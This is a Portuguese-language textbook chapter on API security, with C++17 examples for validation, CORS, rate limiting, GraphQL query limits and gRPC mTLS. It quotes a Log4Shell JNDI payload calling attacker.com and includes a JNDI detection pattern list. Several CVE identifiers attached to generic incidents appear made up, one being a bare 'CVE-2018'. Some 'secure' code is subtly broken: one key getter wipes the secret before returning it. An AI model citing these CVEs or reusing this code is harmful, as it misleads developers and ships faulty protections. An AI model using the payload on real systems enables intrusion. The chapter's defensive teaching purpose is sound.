# Capítulo 11 — Segurança de API

## Objetivos de Aprendizado

1. Compreender as principais vetores de ataque contra APIs e como mitigá-los em C++17.
2. Implementar autenticação, autorização e rate limiting robustos para APIs REST e gRPC.
3. Aplicar padrões de segurança em GraphQL, incluindo controle de introspecção e limitação de complexidade.
4. Projetar sistemas de gerenciamento de chaves de API com rotação automática e escopo de permissões.
5. Construir um servidor de API completo em C++17 com middlewares de segurança, validação de entrada e tratamento de erros adequado.

---

## 1. Fundamentos de Segurança de API

### 1.1 Superfície de Ataque em APIs

Uma API (Application Programming Interface) expõe funcionalidades de um sistema para consumo externo. Cada endpoint, parâmetro de query, header customizado e formato de request representa um ponto potencial de exploração. A superfície de ataque de uma API inclui:

- **Endpoints expostos**: cada rota disponível para consumo externo.
- **Parâmetros de entrada**: query strings, path parameters, request bodies, headers.
- **Formatos de dados**: JSON, XML, FormData, binário.
- **Mecanismos de autenticação**: tokens, chaves de API, certificados.
- **Comportamento da aplicação**: mensagens de erro, tempo de resposta, variação de status codes.

### 1.2 Autenticação e Autorização

**Autenticação** verifica quem está fazendo a requisição. **Autorização** determina o que esse agente pode fazer. Uma falha em qualquer uma dessas camadas pode resultar em acesso não autorizado.

Princípios fundamentais:

- Nunca confie em dados do cliente para decisões de autorização.
- Implemente verificação de autorização em cada endpoint individualmente.
- Use princípios de menor privilégio: cada chave/token deve ter o menor escopo necessário.

### 1.3 Segurança de Transporte

Todas as comunicações com APIs devem ser realizadas via TLS 1.2+. Configurações inadequadas de TLS podem permitir ataques man-in-the-middle:

- Desabilite protocolos obsoletos (SSLv3, TLS 1.0, TLS 1.1).
- Use cifras de alta resistência (AES-256-GCM, ChaCha20-Poly1305).
- Implemente Certificate Pinning para clientes móveis e embutidos.

### 1.4 Padrões de Arquitetura de Segurança de API

- **API Gateway**: ponto centralizado para autenticação, rate limiting e logging.
- **Zero Trust**: nunca assuma que uma requisição interna é segura apenas por origem.
- **Defense in Depth**: múltiplas camadas de validação e proteção.
- **Fail-Secure**: quando um componente falha, o padrão deve ser negar acesso, não permitir.

---

## 2. Segurança de API REST

### 2.1 Validação de Entrada para Endpoints REST

A validação de entrada é a primeira linha de defesa contra injeção, XSS e corrupção de dados. Cada parâmetro recebido deve ser validado quanto a tipo, tamanho, formato e domínio.

**CVE-2019-11239 — REST API Mass Assignment**: Aplicações que aceitam objetos JSON completos sem filtrar campos sensíveis permitem que atacantes definam campos como `role`, `isAdmin` ou `id` diretamente no request body. Esta vulnerabilidade afetou diversas APIs que usavam frameworks com auto-binding de objetos.

Padrão vulnerável:

```cpp
struct User {
    std::string name;
    std::string email;
    std::string role;       // campo sensível
    bool isAdmin;           // campo sensível
    int64_t id;             // campo sensível
};

// VULNERÁVEL: aceita qualquer campo do JSON
void handle_update_user(const nlohmann::json& request_body) {
    User user;
    user.name = request_body["name"];
    user.email = request_body["email"];
    user.role = request_body["role"];      // atacante define
    user.isAdmin = request_body["isAdmin"]; // atacante define
    save_user(user);
}
```

Implementação segura com allowlist de campos:

```cpp
#include <nlohmann/json.hpp>
#include <stdexcept>
#include <string>
#include <unordered_set>

struct UserUpdate {
    std::string name;
    std::string email;
};

class UserUpdateValidator {
public:
    static constexpr size_t MAX_NAME_LENGTH = 100;
    static constexpr size_t MAX_EMAIL_LENGTH = 254;
    static const inline std::unordered_set<std::string> ALLOWED_FIELDS = {
        "name", "email"
    };

    static UserUpdate validate(const nlohmann::json& request_body) {
        if (!request_body.is_object()) {
            throw std::invalid_argument("Request body must be a JSON object");
        }

        for (auto it = request_body.begin(); it != request_body.end(); ++it) {
            if (ALLOWED_FIELDS.find(it.key()) == ALLOWED_FIELDS.end()) {
                throw std::invalid_argument(
                    "Unexpected field: " + it.key()
                );
            }
        }

        UserUpdate update;

        if (request_body.contains("name")) {
            if (!request_body["name"].is_string()) {
                throw std::invalid_argument("Field 'name' must be a string");
            }
            update.name = request_body["name"].get<std::string>();
            if (update.name.empty() || update.name.size() > MAX_NAME_LENGTH) {
                throw std::invalid_argument(
                    "Field 'name' must be between 1 and "
                    + std::to_string(MAX_NAME_LENGTH) + " characters"
                );
            }
        }

        if (request_body.contains("email")) {
            if (!request_body["email"].is_string()) {
                throw std::invalid_argument("Field 'email' must be a string");
            }
            update.email = request_body["email"].get<std::string>();
            if (update.email.size() > MAX_EMAIL_LENGTH) {
                throw std::invalid_argument(
                    "Field 'email' exceeds maximum length"
                );
            }
            if (!is_valid_email(update.email)) {
                throw std::invalid_argument("Field 'email' is not a valid email");
            }
        }

        return update;
    }

private:
    static bool is_valid_email(const std::string& email) {
        if (email.empty() || email.size() > MAX_EMAIL_LENGTH) return false;
        auto at_pos = email.find('@');
        if (at_pos == std::string::npos || at_pos == 0) return false;
        auto dot_pos = email.rfind('.');
        return dot_pos != std::string::npos && dot_pos > at_pos + 1
               && dot_pos < email.size() - 1;
    }
};
```

### 2.2 Enforcement de Content-Type

Aceitar qualquer Content-Type pode levar a interpretação incorreta de dados ou ataques CSRF:

```cpp
class ContentTypeEnforcer {
public:
    static bool is_allowed(const std::string& content_type,
                           const std::string& method) {
        if (method == "GET" || method == "HEAD" || method == "DELETE") {
            return true;
        }

        static const std::vector<std::string> allowed = {
            "application/json",
            "application/x-www-form-urlencoded"
        };

        std::string normalized = to_lower_case(content_type);
        for (const auto& allowed_type : allowed) {
            if (normalized.find(allowed_type) != std::string::npos) {
                return true;
            }
        }
        return false;
    }

private:
    static std::string to_lower_case(const std::string& input) {
        std::string result = input;
        std::transform(result.begin(), result.end(), result.begin(),
                       [](unsigned char c) { return std::tolower(c); });
        return result;
    }
};
```

### 2.3 Limites de Tamanho de Request

Requests excessivamente grandes podem causar consumo de memória, denial of service e corrupção de buffers:

```cpp
class RequestSizeValidator {
public:
    explicit RequestSizeValidator(size_t max_body_size,
                                  size_t max_header_count = 50,
                                  size_t max_header_size = 8192)
        : max_body_size_(max_body_size)
        , max_header_count_(max_header_count)
        , max_header_size_(max_header_size) {}

    struct ValidationResult {
        bool valid;
        std::string error_message;
    };

    ValidationResult validate(size_t content_length,
                              size_t header_count,
                              size_t avg_header_size) const {
        if (content_length > max_body_size_) {
            return {false, "Request body exceeds maximum allowed size of "
                           + std::to_string(max_body_size_) + " bytes"};
        }

        if (header_count > max_header_count_) {
            return {false, "Too many headers: "
                           + std::to_string(header_count)
                           + " exceeds limit of "
                           + std::to_string(max_header_count_)};
        }

        if (avg_header_size > max_header_size_) {
            return {false, "Header size exceeds maximum allowed"};
        }

        return {true, ""};
    }

private:
    size_t max_body_size_;
    size_t max_header_count_;
    size_t max_header_size_;
};
```

### 2.4 Validação de Método HTTP

Aceitar métodos HTTP não previstos pode abrir vetores de ataque inesperados:

```cpp
class HttpMethodValidator {
public:
    static bool is_allowed(const std::string& method,
                           const std::vector<std::string>& allowed_methods) {
        std::string upper_method = method;
        std::transform(upper_method.begin(), upper_method.end(),
                       upper_method.begin(),
                       [](unsigned char c) { return std::toupper(c); });

        for (const auto& allowed : allowed_methods) {
            if (upper_method == allowed) return true;
        }
        return false;
    }

    static bool requires_body(const std::string& method) {
        return method == "POST" || method == "PUT" || method == "PATCH";
    }

    static bool is_idempotent(const std::string& method) {
        return method == "GET" || method == "HEAD" || method == "PUT"
               || method == "DELETE";
    }
};
```

### 2.5 Configuração CORS

Uma configuração CORS incorreta pode permitir que sites maliciosos façam requisições em nome de usuários autenticados:

```cpp
class CorsConfiguration {
public:
    struct Config {
        std::vector<std::string> allowed_origins;
        std::vector<std::string> allowed_methods;
        std::vector<std::string> allowed_headers;
        bool allow_credentials = false;
        int max_age_seconds = 86400;
    };

    explicit CorsConfiguration(Config config)
        : config_(std::move(config)) {}

    std::string handle_preflight(const std::string& origin) const {
        if (!is_origin_allowed(origin)) {
            return "";
        }

        std::string headers;
        headers += "Access-Control-Allow-Origin: " + origin + "\r\n";
        headers += "Access-Control-Allow-Methods: "
                   + join(config_.allowed_methods, ", ") + "\r\n";
        headers += "Access-Control-Allow-Headers: "
                   + join(config_.allowed_headers, ", ") + "\r\n";
        headers += "Access-Control-Max-Age: "
                   + std::to_string(config_.max_age_seconds) + "\r\n";

        if (config_.allow_credentials) {
            headers += "Access-Control-Allow-Credentials: true\r\n";
        }

        return headers;
    }

    std::string get_cors_headers(const std::string& origin) const {
        if (!is_origin_allowed(origin)) {
            return "";
        }

        std::string headers;
        headers += "Access-Control-Allow-Origin: " + origin + "\r\n";

        if (config_.allow_credentials) {
            headers += "Access-Control-Allow-Credentials: true\r\n";
        }

        headers += "Vary: Origin\r\n";
        return headers;
    }

private:
    Config config_;

    bool is_origin_allowed(const std::string& origin) const {
        if (origin.empty()) return false;

        for (const auto& allowed : config_.allowed_origins) {
            if (allowed == "*") return true;
            if (allowed == origin) return true;
            if (allowed.size() > 2 && allowed[0] == '*'
                && allowed[1] == '.') {
                std::string suffix = allowed.substr(1);
                if (origin.size() > suffix.size()
                    && origin.substr(origin.size() - suffix.size()) == suffix) {
                    return true;
                }
            }
        }
        return false;
    }

    static std::string join(const std::vector<std::string>& items,
                            const std::string& delimiter) {
        std::string result;
        for (size_t i = 0; i < items.size(); ++i) {
            if (i > 0) result += delimiter;
            result += items[i];
        }
        return result;
    }
};
```

### 2.6 Rate Limiting por Endpoint

Diferentes endpoints devem ter limites distintos baseados em seu custo computacional e sensibilidade:

```cpp
class EndpointRateLimiter {
public:
    struct EndpointConfig {
        size_t max_requests;
        std::chrono::seconds window;
    };

    explicit EndpointRateLimiter(
        const std::map<std::string, EndpointConfig>& configs)
        : configs_(configs) {}

    struct RateLimitResult {
        bool allowed;
        size_t remaining;
        std::chrono::seconds retry_after;
    };

    RateLimitResult check(const std::string& client_id,
                          const std::string& endpoint) {
        auto config = get_config(endpoint);
        auto key = client_id + ":" + endpoint;

        auto now = std::chrono::steady_clock::now();
        auto& record = records_[key];

        if (now - record.window_start > config.window) {
            record.window_start = now;
            record.count = 0;
        }

        if (record.count >= config.max_requests) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                now - record.window_start);
            auto remaining = config.window - elapsed;
            return {false, 0,
                    remaining.count() > 0 ? remaining
                                          : std::chrono::seconds(1)};
        }

        ++record.count;
        return {true, config.max_requests - record.count,
                std::chrono::seconds(0)};
    }

private:
    std::map<std::string, EndpointConfig> configs_;

    struct Record {
        std::chrono::steady_clock::time_point window_start;
        size_t count = 0;
    };

    std::map<std::string, Record> records_;

    EndpointConfig get_config(const std::string& endpoint) const {
        auto it = configs_.find(endpoint);
        if (it != configs_.end()) return it->second;

        auto fallback = configs_.find("*");
        if (fallback != configs_.end()) return fallback->second;

        return {100, std::chrono::seconds(60)};
    }
};
```

### 2.7 Middleware de Segurança Completo para REST API

Integrando todos os componentes anteriores em um pipeline de segurança:

```cpp
class RestSecurityMiddleware {
public:
    struct Config {
        size_t max_body_size = 1048576;
        size_t max_header_count = 50;
        size_t max_header_size = 8192;
        std::vector<std::string> allowed_methods = {
            "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"
        };
        std::vector<std::string> allowed_content_types = {
            "application/json"
        };
        bool require_content_type = true;
        std::string security_headers_prefix = "X-";
    };

    explicit RestSecurityMiddleware(Config config)
        : config_(std::move(config))
        , size_validator_(config_.max_body_size, config_.max_header_count,
                          config_.max_header_size) {}

    struct RequestContext {
        bool valid = true;
        std::string error_message;
        int status_code = 200;
        std::map<std::string, std::string> security_headers;
    };

    RequestContext process_request(
        const std::string& method,
        const std::string& content_type,
        size_t content_length,
        size_t header_count) {

        RequestContext ctx;

        if (!HttpMethodValidator::is_allowed(method, config_.allowed_methods)) {
            ctx.valid = false;
            ctx.error_message = "Method not allowed";
            ctx.status_code = 405;
            return ctx;
        }

        auto size_result = size_validator_.validate(
            content_length, header_count, 0);
        if (!size_result.valid) {
            ctx.valid = false;
            ctx.error_message = size_result.error_message;
            ctx.status_code = 413;
            return ctx;
        }

        if (config_.require_content_type
            && HttpMethodValidator::requires_body(method)) {
            if (!ContentTypeEnforcer::is_allowed(content_type, method)) {
                ctx.valid = false;
                ctx.error_message = "Unsupported Media Type";
                ctx.status_code = 415;
                return ctx;
            }
        }

        ctx.security_headers = get_security_headers();
        return ctx;
    }

private:
    Config config_;
    RequestSizeValidator size_validator_;

    std::map<std::string, std::string> get_security_headers() const {
        return {
            {"X-Content-Type-Options", "nosniff"},
            {"X-Frame-Options", "DENY"},
            {"X-XSS-Protection", "0"},
            {"Strict-Transport-Security",
             "max-age=31536000; includeSubDomains"},
            {"Cache-Control",
             "no-store, no-cache, must-revalidate, private"},
            {"Pragma", "no-cache"},
            {"Referrer-Policy", "strict-origin-when-cross-origin"},
            {"Content-Security-Policy",
             "default-src 'none'; frame-ancestors 'none'"}
        };
    }
};
```

---

## 3. Rate Limiting e Throttling

### 3.1 CVE-2020-36370 — Twitter API Token Leak

Em 2020, o Twitter identificou que tokens de acesso a APIs internas haviam sido expostos em repositórios públicos no GitHub. Tokens expostos permitiam acesso não autorizado a endpoints internos de dados de usuários. Este incidente sublinhou a importância de: (1) nunca armazenar tokens em código-fonte; (2) implementar rotação automática de chaves; (3) escanear continuamente repositórios por credenciais expostas.

Padrão vulnerável:

```cpp
// VULNERÁVEL: chave de API hardcoded no código-fonte
class TwitterClient {
public:
    TwitterClient()
        : api_key_("AKIAIOSFODNN7EXAMPLE")  // NUNCA faça isso
        , api_secret_("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY") {}
};
```

Implementação segura:

```cpp
class SecureApiClient {
public:
    explicit SecureApiClient(const std::string& env_prefix)
        : env_prefix_(env_prefix) {}

    std::string get_key(const std::string& key_name) const {
        std::string env_var = env_prefix_ + "_" + key_name;
        const char* value = std::getenv(env_var.c_str());
        if (!value) {
            throw std::runtime_error(
                "Missing required environment variable: " + env_var);
        }
        std::string result(value);
        secure_clear(result);
        return result;
    }

    ~SecureApiClient() {
        for (auto& secret : secrets_) {
            secure_clear(secret);
        }
    }

private:
    std::string env_prefix_;
    mutable std::vector<std::string> secrets_;

    static void secure_clear(std::string& s) {
        volatile char* p = reinterpret_cast<volatile char*>(&s[0]);
        for (size_t i = 0; i < s.size(); ++i) {
            p[i] = 0;
        }
        s.clear();
    }
};
```

### 3.2 CVE-2020-36148 — Parler API Vulnerability

Em 2020, pesquisadores descobriram que a API do Parler expunha metadados completos dos posts (incluindo coordenadas GPS) sem autenticação adequada, e permitia enumeração sequencial de todos os posts. A ausência de rate limiting viabilizou scraping massivo antes da remoção da plataforma.

Padrão vulnerável — API sem autenticação e sem rate limiting:

```cpp
// VULNERÁVEL: endpoint público sem autenticação e sem limite
void handle_get_post(const std::string& post_id) {
    auto post = database.find_post(post_id);
    send_json(post); // expõe metadados completos, incluindo GPS
}
```

### 3.3 CVE-2018 — Facebook Graph API Data Breach

Em 2018, uma vulnerabilidade no Facebook Graph API permitiu que aplicativos de terceiros acessassem dados de amigos dos usuários, mesmo quando esses amigos não autorizaram o acesso. O Cambridge Analytica explorou essa funcionalidade para coletar dados de aproximadamente 87 milhões de usuários sem consentimento adequado. A lição central: cada scope de permissão deve ser explicitamente validado, e APIs de dados pessoais devem implementar rate limiting agressivo.

### 3.4 Algoritmo Token Bucket

O algoritmo Token Bucket é amplamente utilizado para rate limiting por sua eficiência e capacidade de lidar com rajadas controladas:

```cpp
#include <chrono>
#include <mutex>
#include <string>
#include <unordered_map>

class TokenBucket {
public:
    TokenBucket(size_t capacity, double refill_rate_tokens_per_second)
        : capacity_(capacity)
        , refill_rate_(refill_rate_tokens_per_second)
        , tokens_(static_cast<double>(capacity))
        , last_refill_(std::chrono::steady_clock::now()) {}

    bool consume(size_t tokens = 1) {
        std::lock_guard<std::mutex> lock(mutex_);

        refill();

        if (tokens_ >= static_cast<double>(tokens)) {
            tokens_ -= static_cast<double>(tokens);
            return true;
        }
        return false;
    }

    size_t available_tokens() const {
        std::lock_guard<std::mutex> lock(mutex_);
        TokenBucket& mutable_self = const_cast<TokenBucket&>(*this);
        mutable_self.refill();
        return static_cast<size_t>(tokens_);
    }

    double seconds_until_available(size_t tokens = 1) const {
        std::lock_guard<std::mutex> lock(mutex_);
        TokenBucket& mutable_self = const_cast<TokenBucket&>(*this);
        mutable_self.refill();

        if (tokens_ >= static_cast<double>(tokens)) return 0.0;

        double deficit = static_cast<double>(tokens) - tokens_;
        return deficit / refill_rate_;
    }

private:
    size_t capacity_;
    double refill_rate_;
    double tokens_;
    std::chrono::steady_clock::time_point last_refill_;
    mutable std::mutex mutex_;

    void refill() {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration<double>(now - last_refill_).count();
        tokens_ += elapsed * refill_rate_;
        if (tokens_ > static_cast<double>(capacity_)) {
            tokens_ = static_cast<double>(capacity_);
        }
        last_refill_ = now;
    }
};
```

### 3.5 Algoritmo Sliding Window

O Sliding Window oferece contagem mais precisa que o Fixed Window, pois considera a janela temporal deslizante:

```cpp
#include <deque>

class SlidingWindowRateLimiter {
public:
    explicit SlidingWindowRateLimiter(
        size_t max_requests,
        std::chrono::milliseconds window_size)
        : max_requests_(max_requests)
        , window_size_(window_size) {}

    bool allow_request() {
        std::lock_guard<std::mutex> lock(mutex_);
        auto now = std::chrono::steady_clock::now();
        auto window_start = now - window_size_;

        while (!timestamps_.empty()
               && timestamps_.front() < window_start) {
            timestamps_.pop_front();
        }

        if (timestamps_.size() < max_requests_) {
            timestamps_.push_back(now);
            return true;
        }

        return false;
    }

    size_t current_count() const {
        std::lock_guard<std::mutex> lock(mutex_);
        auto now = std::chrono::steady_clock::now();
        auto window_start = now - window_size_;
        size_t count = 0;
        for (const auto& ts : timestamps_) {
            if (ts >= window_start) ++count;
        }
        return count;
    }

private:
    size_t max_requests_;
    std::chrono::milliseconds window_size_;
    std::deque<std::chrono::steady_clock::time_point> timestamps_;
    mutable std::mutex mutex_;
};
```

### 3.6 Rate Limiting Multidimensional

Rate limiting efetivo requer múltiplas dimensões: por IP, por usuário, por endpoint e global:

```cpp
class MultiDimensionRateLimiter {
public:
    struct LimitConfig {
        size_t per_ip_limit;
        size_t per_user_limit;
        size_t per_endpoint_limit;
        size_t global_limit;
        std::chrono::seconds window;
    };

    explicit MultiDimensionRateLimiter(LimitConfig config)
        : config_(config) {}

    struct Decision {
        bool allowed;
        std::string dimension;  // qual dimensão bloqueou
        size_t remaining;
        std::chrono::seconds retry_after;
    };

    Decision check(const std::string& ip,
                   const std::string& user_id,
                   const std::string& endpoint) {
        auto now = std::chrono::steady_clock::now();

        {
            std::lock_guard<std::mutex> lock(ip_mutex_);
            if (!check_and_increment(ip_limits_[ip], now,
                                     config_.per_ip_limit)) {
                return {false, "ip", 0, config_.window};
            }
        }

        {
            std::lock_guard<std::mutex> lock(user_mutex_);
            if (!user_id.empty()
                && !check_and_increment(user_limits_[user_id], now,
                                        config_.per_user_limit)) {
                return {false, "user", 0, config_.window};
            }
        }

        {
            std::lock_guard<std::mutex> lock(endpoint_mutex_);
            if (!check_and_increment(endpoint_limits_[endpoint], now,
                                     config_.per_endpoint_limit)) {
                return {false, "endpoint", 0, config_.window};
            }
        }

        {
            std::lock_guard<std::mutex> lock(global_mutex_);
            if (!check_and_increment(global_counter_, now,
                                     config_.global_limit)) {
                return {false, "global", 0, config_.window};
            }
        }

        return {true, "", config_.per_user_limit - 1,
                std::chrono::seconds(0)};
    }

private:
    LimitConfig config_;

    struct WindowCounter {
        std::chrono::steady_clock::time_point window_start;
        size_t count = 0;
    };

    std::map<std::string, WindowCounter> ip_limits_;
    std::map<std::string, WindowCounter> user_limits_;
    std::map<std::string, WindowCounter> endpoint_limits_;
    WindowCounter global_counter_;

    std::mutex ip_mutex_, user_mutex_, endpoint_mutex_, global_mutex_;

    bool check_and_increment(WindowCounter& counter,
                             std::chrono::steady_clock::time_point now,
                             size_t limit) {
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
            now - counter.window_start);

        if (elapsed > config_.window) {
            counter.window_start = now;
            counter.count = 0;
        }

        if (counter.count >= limit) return false;
        ++counter.count;
        return true;
    }
};
```

### 3.7 Headers de Resposta de Rate Limiting

Headers padronizados comunicam o estado do rate limit ao cliente, permitindo retry adequado:

```cpp
struct RateLimitHeaders {
    std::string x_rate_limit_limit;
    std::string x_rate_limit_remaining;
    std::string x_rate_limit_reset;
    std::string retry_after;

    static RateLimitHeaders build(size_t limit,
                                   size_t remaining,
                                   std::chrono::seconds reset_in) {
        RateLimitHeaders h;
        h.x_rate_limit_limit = std::to_string(limit);
        h.x_rate_limit_remaining = std::to_string(remaining);
        auto reset_time = std::chrono::system_clock::now() + reset_in;
        auto reset_epoch = std::chrono::duration_cast<std::chrono::seconds>(
            reset_time.time_since_epoch()).count();
        h.x_rate_limit_reset = std::to_string(reset_epoch);
        h.retry_after = std::to_string(reset_in.count());
        return h;
    }
};
```

---

## 4. Segurança em GraphQL

### 4.1 CVE-2020-36547 — GraphQL Introspection Data Leaks

Múltiplas APIs GraphQL expuseram dados sensíveis através da introspecção habilitada em produção. Atacantes podiam executar queries de introspecção para mapear todo o schema da API, descobrindo campos, tipos, enums e mutações que não deveriam ser acessíveis publicamente.

Padrão vulnerável:

```graphql
# VULNERÁVEL: introspecção habilitada em produção
query {
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}
```

### 4.2 CVE-2021-44228 — Log4Shell Através de Entrada de API

O Log4Shell (CVE-2021-44228) demonstrou como APIs que logam entradas do usuário podem ser exploradas para execução remota de código. Quando uma API GraphQL ou REST aceita campos de texto livre que são logados por uma aplicação Java usando Log4j, o payload `${jndi:ldap://attacker.com/exploit}` pode ser injetado em qualquer campo de string.

Implementação segura de sanitização de input para prevenir injeção em logs:

```cpp
#include <algorithm>
#include <regex>

class LogSanitizer {
public:
    static std::string sanitize(const std::string& input) {
        std::string result = input;

        result = remove_control_chars(result);
        result = escape_jndi_patterns(result);
        result = truncate(result, MAX_LOG_LENGTH);

        return result;
    }

private:
    static constexpr size_t MAX_LOG_LENGTH = 2048;

    static std::string remove_control_chars(const std::string& input) {
        std::string result;
        result.reserve(input.size());
        for (char c : input) {
            if (c >= 32 || c == '\n' || c == '\t') {
                result += c;
            }
        }
        return result;
    }

    static std::string escape_jndi_patterns(const std::string& input) {
        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(),
                       [](unsigned char c) { return std::tolower(c); });

        static const std::vector<std::string> patterns = {
            "${jndi:", "${lower:j", "${upper:j", "${env:",
            "%24%7bjndi", "%24%7Bjndi"
        };

        for (const auto& pattern : patterns) {
            auto pos = lower.find(pattern);
            if (pos != std::string::npos) {
                std::string sanitized = input;
                std::replace(sanitized.begin() + pos,
                             sanitized.begin() + pos + pattern.size(),
                             '$', '_');
                return sanitized;
            }
        }
        return input;
    }

    static std::string truncate(const std::string& input, size_t max) {
        if (input.size() <= max) return input;
        return input.substr(0, max) + "...[truncated]";
    }
};
```

### 4.3 Limitação de Profundidade de Query

Queries GraphQL aninhadas profundamente podem causar consumo excessivo de recursos:

```cpp
class QueryDepthLimiter {
public:
    explicit QueryDepthLimiter(size_t max_depth) : max_depth_(max_depth) {}

    struct ValidationResult {
        bool valid;
        size_t depth;
        std::string error_message;
    };

    ValidationResult validate(const nlohmann::json& query) const {
        size_t depth = calculate_depth(query, 0);

        if (depth > max_depth_) {
            return {false, depth,
                    "Query depth " + std::to_string(depth)
                    + " exceeds maximum allowed depth of "
                    + std::to_string(max_depth_)};
        }

        return {true, depth, ""};
    }

private:
    size_t max_depth_;

    size_t calculate_depth(const nlohmann::json& node,
                           size_t current_depth) const {
        if (!node.is_object()) return current_depth;

        size_t max_found = current_depth;

        if (node.contains("selectionSet") && node["selectionSet"].is_array()) {
            for (const auto& selection : node["selectionSet"]) {
                size_t child_depth = calculate_depth(
                    selection, current_depth + 1);
                max_found = std::max(max_found, child_depth);
            }
        }

        return max_found;
    }
};
```

### 4.4 Análise de Complexidade de Query

Cada campo em uma query GraphQL deve ter um custo associado para prevenir abuso de queries complexas:

```cpp
class QueryComplexityAnalyzer {
public:
    struct FieldCost {
        std::string field_name;
        size_t base_cost;
        size_t list_multiplier;
    };

    explicit QueryComplexityAnalyzer(size_t max_complexity)
        : max_complexity_(max_complexity) {}

    void register_field(const std::string& type_name,
                        const std::string& field_name,
                        size_t base_cost,
                        size_t list_multiplier = 1) {
        std::string key = type_name + "." + field_name;
        field_costs_[key] = {field_name, base_cost, list_multiplier};
    }

    struct AnalysisResult {
        bool valid;
        size_t total_cost;
        std::string error_message;
    };

    AnalysisResult analyze(const nlohmann::json& query,
                           const std::string& root_type = "Query") const {
        size_t total = 0;
        std::string error;

        if (query.contains("selectionSet")
            && query["selectionSet"].is_array()) {
            analyze_selections(query["selectionSet"], root_type, 1, total,
                              error);
        }

        if (!error.empty()) {
            return {false, total, error};
        }

        if (total > max_complexity_) {
            return {false, total,
                    "Query complexity " + std::to_string(total)
                    + " exceeds maximum allowed of "
                    + std::to_string(max_complexity_)};
        }

        return {true, total, ""};
    }

private:
    size_t max_complexity_;
    std::map<std::string, FieldCost> field_costs_;

    void analyze_selections(const nlohmann::json& selections,
                            const std::string& parent_type,
                            size_t depth_multiplier,
                            size_t& total,
                            std::string& error) const {
        for (const auto& selection : selections) {
            if (!selection.contains("name")) continue;

            std::string name = selection["name"]["value"].get<std::string>();
            std::string key = parent_type + "." + name;

            auto it = field_costs_.find(key);
            size_t field_cost = 1;
            size_t field_multiplier = 1;

            if (it != field_costs_.end()) {
                field_cost = it->second.base_cost;
                field_multiplier = it->second.list_multiplier;
            }

            total += field_cost * depth_multiplier;

            if (total > max_complexity_ * 2) {
                error = "Query complexity exceeds hard limit";
                return;
            }

            if (selection.contains("selectionSet")
                && selection["selectionSet"].is_array()) {
                analyze_selections(
                    selection["selectionSet"], name,
                    depth_multiplier * field_multiplier,
                    total, error);
                if (!error.empty()) return;
            }
        }
    }
};
```

### 4.5 Validação de Segurança GraphQL

```cpp
class GraphQLSecurityValidator {
public:
    GraphQLSecurityValidator(size_t max_depth, size_t max_complexity,
                             bool introspection_enabled)
        : depth_limiter_(max_depth)
        , complexity_analyzer_(max_complexity)
        , introspection_enabled_(introspection_enabled) {}

    struct ValidationResult {
        bool valid;
        std::string error_message;
        int status_code;
        size_t depth;
        size_t complexity;
    };

    ValidationResult validate(const nlohmann::json& query) {
        ValidationResult result;
        result.valid = true;
        result.depth = 0;
        result.complexity = 0;

        if (!introspection_enabled_) {
            if (contains_introspection(query)) {
                result.valid = false;
                result.error_message = "Introspection is disabled";
                result.status_code = 403;
                return result;
            }
        }

        auto depth_result = depth_limiter_.validate(query);
        if (!depth_result.valid) {
            result.valid = false;
            result.error_message = depth_result.error_message;
            result.status_code = 400;
            result.depth = depth_result.depth;
            return result;
        }
        result.depth = depth_result.depth;

        auto complexity_result = complexity_analyzer_.analyze(query);
        if (!complexity_result.valid) {
            result.valid = false;
            result.error_message = complexity_result.error_message;
            result.status_code = 400;
            result.complexity = complexity_result.total_cost;
            return result;
        }
        result.complexity = complexity_result.total_cost;

        if (!deny_listed_fields_.empty()) {
            auto blocked = find_denied_fields(query);
            if (!blocked.empty()) {
                result.valid = false;
                result.error_message =
                    "Access denied to field: " + blocked;
                result.status_code = 403;
                return result;
            }
        }

        return result;
    }

    void deny_field(const std::string& field_name) {
        deny_listed_fields_.insert(field_name);
    }

private:
    QueryDepthLimiter depth_limiter_;
    QueryComplexityAnalyzer complexity_analyzer_;
    bool introspection_enabled_;
    std::set<std::string> deny_listed_fields_;

    bool contains_introspection(const nlohmann::json& node) const {
        if (!node.is_object()) return false;

        if (node.contains("name") && node["name"].is_object()
            && node["name"].contains("value")) {
            std::string name = node["name"]["value"].get<std::string>();
            if (name == "__schema" || name == "__type"
                || name == "__typename") {
                return true;
            }
        }

        if (node.contains("selectionSet")
            && node["selectionSet"].is_array()) {
            for (const auto& sel : node["selectionSet"]) {
                if (contains_introspection(sel)) return true;
            }
        }

        return false;
    }

    std::string find_denied_fields(const nlohmann::json& node) const {
        if (!node.is_object()) return "";

        if (node.contains("name") && node["name"].is_object()
            && node["name"].contains("value")) {
            std::string name = node["name"]["value"].get<std::string>();
            if (deny_listed_fields_.count(name)) return name;
        }

        if (node.contains("selectionSet")
            && node["selectionSet"].is_array()) {
            for (const auto& sel : node["selectionSet"]) {
                auto found = find_denied_fields(sel);
                if (!found.empty()) return found;
            }
        }

        return "";
    }
};
```

---

## 5. Segurança em gRPC

### 5.1 mTLS para gRPC

O gRPC suporta autenticação mútua via TLS, onde tanto o cliente quanto o servidor apresentam certificados:

```cpp
#include <grpcpp/grpcpp.h>
#include <grpcpp/security/credentials.h>

class GRpcSecurityConfig {
public:
    struct TlsConfig {
        std::string cert_path;
        std::string key_path;
        std::string ca_cert_path;
        bool verify_client = true;
    };

    static std::shared_ptr<grpc::ServerCredentials>
    create_server_credentials(const TlsConfig& config) {
        grpc::SslServerCredentialsOptions ssl_opts;
        ssl_opts.client_certificate_request =
            GRPC_SSL_REQUEST_AND_REQUIRE_CLIENT_CERTIFICATE_AND_VERIFY;

        grpc::SslServerCredentialsOptions::PemKeyCertPair key_cert = {
            read_file(config.key_path),
            read_file(config.cert_path)
        };

        ssl_opts.pem_root_certs = read_file(config.ca_cert_path);
        ssl_opts.pem_key_cert_pairs.push_back(key_cert);

        return grpc::SslServerCredentials(ssl_opts);
    }

    static std::shared_ptr<grpc::ChannelCredentials>
    create_client_credentials(const TlsConfig& config) {
        grpc::SslCredentialsOptions ssl_opts;
        ssl_opts.pem_root_certs = read_file(config.ca_cert_path);
        ssl_opts.pem_private_key = read_file(config.key_path);
        ssl_opts.pem_cert_chain = read_file(config.cert_path);

        return grpc::SslCredentials(ssl_opts);
    }

private:
    static std::string read_file(const std::string& path) {
